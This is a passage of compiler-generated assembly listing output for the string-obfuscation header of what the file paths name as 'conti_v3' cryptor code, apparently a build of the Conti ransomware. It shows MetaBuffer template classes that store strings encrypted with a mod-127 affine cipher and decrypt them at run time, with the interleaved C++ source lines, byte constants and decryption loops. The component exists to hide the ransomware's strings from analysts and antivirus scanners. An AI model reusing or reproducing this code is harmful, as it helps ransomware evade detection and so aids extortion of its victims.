  000f7	c6 41 3e 73	 mov	 BYTE PTR [rcx+62], 115	; 00000073H
  000fb	c6 41 3f 5a	 mov	 BYTE PTR [rcx+63], 90	; 0000005aH
  000ff	c6 41 40 73	 mov	 BYTE PTR [rcx+64], 115	; 00000073H
  00103	c6 41 41 1e	 mov	 BYTE PTR [rcx+65], 30
  00107	c6 41 42 73	 mov	 BYTE PTR [rcx+66], 115	; 00000073H
  0010b	c6 41 43 4c	 mov	 BYTE PTR [rcx+67], 76	; 0000004cH
  0010f	c6 41 44 73	 mov	 BYTE PTR [rcx+68], 115	; 00000073H
  00113	c6 41 45 1e	 mov	 BYTE PTR [rcx+69], 30
  00117	c6 41 46 73	 mov	 BYTE PTR [rcx+70], 115	; 00000073H
  0011b	c6 41 47 6c	 mov	 BYTE PTR [rcx+71], 108	; 0000006cH
  0011f	c6 41 48 73	 mov	 BYTE PTR [rcx+72], 115	; 00000073H
  00123	c6 41 49 62	 mov	 BYTE PTR [rcx+73], 98	; 00000062H
  00127	c6 41 4a 73	 mov	 BYTE PTR [rcx+74], 115	; 00000073H
  0012b	c6 41 4b 56	 mov	 BYTE PTR [rcx+75], 86	; 00000056H
  0012f	c6 41 4c 73	 mov	 BYTE PTR [rcx+76], 115	; 00000073H
  00133	c6 41 4d 73	 mov	 BYTE PTR [rcx+77], 115	; 00000073H
  00137	c6 41 4e 73	 mov	 BYTE PTR [rcx+78], 115	; 00000073H
  0013b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0013f	48 8b c1	 mov	 rax, rcx

; 51   :         : m_buffer{ encrypt(data[Ints])... }
; 52   :     {
; 53   : 
; 54   :     }

  00142	c3		 ret	 0
??0?$MetaBuffer@$0CJ@$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<41,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77> >::MetaBuffer<41,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GF@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GF@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<101,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 48 00 00
	00		 mov	 r10d, 72		; 00000048H
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 24 00 00 00	 mov	 eax, 36			; 00000024H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 2c	 imul	 ecx, eax, 44		; 0000002cH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GF@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<101,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GF@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GF@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<101,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71> >::MetaBuffer<101,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 76	 mov	 BYTE PTR [rcx+1], 118	; 00000076H
  00007	c6 41 02 24	 mov	 BYTE PTR [rcx+2], 36	; 00000024H
  0000b	c6 41 03 64	 mov	 BYTE PTR [rcx+3], 100	; 00000064H
  0000f	c6 41 04 24	 mov	 BYTE PTR [rcx+4], 36	; 00000024H
  00013	c6 41 05 16	 mov	 BYTE PTR [rcx+5], 22
  00017	c6 41 06 24	 mov	 BYTE PTR [rcx+6], 36	; 00000024H
  0001b	c6 41 07 16	 mov	 BYTE PTR [rcx+7], 22
  0001f	c6 41 08 24	 mov	 BYTE PTR [rcx+8], 36	; 00000024H
  00023	c6 41 09 79	 mov	 BYTE PTR [rcx+9], 121	; 00000079H
  00027	c6 41 0a 24	 mov	 BYTE PTR [rcx+10], 36	; 00000024H
  0002b	c6 41 0b 64	 mov	 BYTE PTR [rcx+11], 100	; 00000064H
  0002f	c6 41 0c 24	 mov	 BYTE PTR [rcx+12], 36	; 00000024H
  00033	c6 41 0d 16	 mov	 BYTE PTR [rcx+13], 22
  00037	c6 41 0e 24	 mov	 BYTE PTR [rcx+14], 36	; 00000024H
  0003b	c6 41 0f 4d	 mov	 BYTE PTR [rcx+15], 77	; 0000004dH
  0003f	c6 41 10 24	 mov	 BYTE PTR [rcx+16], 36	; 00000024H
  00043	c6 41 11 0e	 mov	 BYTE PTR [rcx+17], 14
  00047	c6 41 12 24	 mov	 BYTE PTR [rcx+18], 36	; 00000024H
  0004b	c6 41 13 75	 mov	 BYTE PTR [rcx+19], 117	; 00000075H
  0004f	c6 41 14 24	 mov	 BYTE PTR [rcx+20], 36	; 00000024H
  00053	c6 41 15 61	 mov	 BYTE PTR [rcx+21], 97	; 00000061H
  00057	c6 41 16 24	 mov	 BYTE PTR [rcx+22], 36	; 00000024H
  0005b	c6 41 17 4d	 mov	 BYTE PTR [rcx+23], 77	; 0000004dH
  0005f	c6 41 18 24	 mov	 BYTE PTR [rcx+24], 36	; 00000024H
  00063	c6 41 19 78	 mov	 BYTE PTR [rcx+25], 120	; 00000078H
  00067	c6 41 1a 24	 mov	 BYTE PTR [rcx+26], 36	; 00000024H
  0006b	c6 41 1b 5d	 mov	 BYTE PTR [rcx+27], 93	; 0000005dH
  0006f	c6 41 1c 24	 mov	 BYTE PTR [rcx+28], 36	; 00000024H
  00073	c6 41 1d 33	 mov	 BYTE PTR [rcx+29], 51	; 00000033H
  00077	c6 41 1e 24	 mov	 BYTE PTR [rcx+30], 36	; 00000024H
  0007b	c6 41 1f 47	 mov	 BYTE PTR [rcx+31], 71	; 00000047H
  0007f	c6 41 20 24	 mov	 BYTE PTR [rcx+32], 36	; 00000024H
  00083	c6 41 21 78	 mov	 BYTE PTR [rcx+33], 120	; 00000078H
  00087	c6 41 22 24	 mov	 BYTE PTR [rcx+34], 36	; 00000024H
  0008b	c6 41 23 5d	 mov	 BYTE PTR [rcx+35], 93	; 0000005dH
  0008f	c6 41 24 24	 mov	 BYTE PTR [rcx+36], 36	; 00000024H
  00093	c6 41 25 33	 mov	 BYTE PTR [rcx+37], 51	; 00000033H
  00097	c6 41 26 24	 mov	 BYTE PTR [rcx+38], 36	; 00000024H
  0009b	c6 41 27 64	 mov	 BYTE PTR [rcx+39], 100	; 00000064H
  0009f	c6 41 28 24	 mov	 BYTE PTR [rcx+40], 36	; 00000024H
  000a3	c6 41 29 16	 mov	 BYTE PTR [rcx+41], 22
  000a7	c6 41 2a 24	 mov	 BYTE PTR [rcx+42], 36	; 00000024H
  000ab	c6 41 2b 4d	 mov	 BYTE PTR [rcx+43], 77	; 0000004dH
  000af	c6 41 2c 24	 mov	 BYTE PTR [rcx+44], 36	; 00000024H
  000b3	c6 41 2d 5d	 mov	 BYTE PTR [rcx+45], 93	; 0000005dH
  000b7	c6 41 2e 24	 mov	 BYTE PTR [rcx+46], 36	; 00000024H
  000bb	c6 41 2f 5a	 mov	 BYTE PTR [rcx+47], 90	; 0000005aH
  000bf	c6 41 30 24	 mov	 BYTE PTR [rcx+48], 36	; 00000024H
  000c3	c6 41 31 5e	 mov	 BYTE PTR [rcx+49], 94	; 0000005eH
  000c7	c6 41 32 24	 mov	 BYTE PTR [rcx+50], 36	; 00000024H
  000cb	c6 41 33 5d	 mov	 BYTE PTR [rcx+51], 93	; 0000005dH
  000cf	c6 41 34 24	 mov	 BYTE PTR [rcx+52], 36	; 00000024H
  000d3	c6 41 35 09	 mov	 BYTE PTR [rcx+53], 9
  000d7	c6 41 36 24	 mov	 BYTE PTR [rcx+54], 36	; 00000024H
  000db	c6 41 37 5d	 mov	 BYTE PTR [rcx+55], 93	; 0000005dH
  000df	c6 41 38 24	 mov	 BYTE PTR [rcx+56], 36	; 00000024H
  000e3	c6 41 39 5e	 mov	 BYTE PTR [rcx+57], 94	; 0000005eH
  000e7	c6 41 3a 24	 mov	 BYTE PTR [rcx+58], 36	; 00000024H
  000eb	c6 41 3b 2a	 mov	 BYTE PTR [rcx+59], 42	; 0000002aH
  000ef	c6 41 3c 24	 mov	 BYTE PTR [rcx+60], 36	; 00000024H
  000f3	c6 41 3d 02	 mov	 BYTE PTR [rcx+61], 2
  000f7	c6 41 3e 24	 mov	 BYTE PTR [rcx+62], 36	; 00000024H
  000fb	c6 41 3f 02	 mov	 BYTE PTR [rcx+63], 2
  000ff	c6 41 40 24	 mov	 BYTE PTR [rcx+64], 36	; 00000024H
  00103	c6 41 41 4d	 mov	 BYTE PTR [rcx+65], 77	; 0000004dH
  00107	c6 41 42 24	 mov	 BYTE PTR [rcx+66], 36	; 00000024H
  0010b	c6 41 43 5e	 mov	 BYTE PTR [rcx+67], 94	; 0000005eH
  0010f	c6 41 44 24	 mov	 BYTE PTR [rcx+68], 36	; 00000024H
  00113	c6 41 45 5e	 mov	 BYTE PTR [rcx+69], 94	; 0000005eH
  00117	c6 41 46 24	 mov	 BYTE PTR [rcx+70], 36	; 00000024H
  0011b	c6 41 47 24	 mov	 BYTE PTR [rcx+71], 36	; 00000024H
  0011f	c6 41 48 24	 mov	 BYTE PTR [rcx+72], 36	; 00000024H
  00123	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00127	48 8b c1	 mov	 rax, rcx
  0012a	c3		 ret	 0
??0?$MetaBuffer@$0GF@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<101,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71> >::MetaBuffer<101,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BB@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BB@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<17,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 58 00 00
	00		 mov	 r11d, 88		; 00000058H
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 6f	 sub	 ecx, 111		; 0000006fH

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 0f	 imul	 r8d, ecx, 15

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BB@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<17,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BB@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BB@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<17,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87> >::MetaBuffer<17,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
